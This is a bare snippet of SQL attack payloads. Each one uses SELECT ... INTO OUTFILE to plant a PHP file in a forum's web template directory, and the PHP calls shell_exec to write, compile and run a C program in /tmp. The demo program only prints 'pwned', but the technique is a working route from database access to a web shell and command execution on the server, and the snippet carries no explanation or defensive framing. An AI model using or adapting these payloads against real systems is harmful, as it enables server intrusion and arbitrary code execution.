SELECT '
<?php
shell_exec("echo \'int main(){write(1, \"pwned\", 6);}\' > /tmp/exploit.c");
shell_exec("gcc -pthread /tmp/exploit.c -o /tmp/exploit -lcrypt");
shell_exec("/tmp/exploit");
?>
INTO OUTFILE '/var/www/forum/templates_c/exploit.php'

SELECT '<?php shell_exec("echo \'int main(){write(1, \"pwned\", 6);}\' > /tmp/exploit.c");?>'
INTO OUTFILE '/var/www/forum/templates_c/exploit3.php'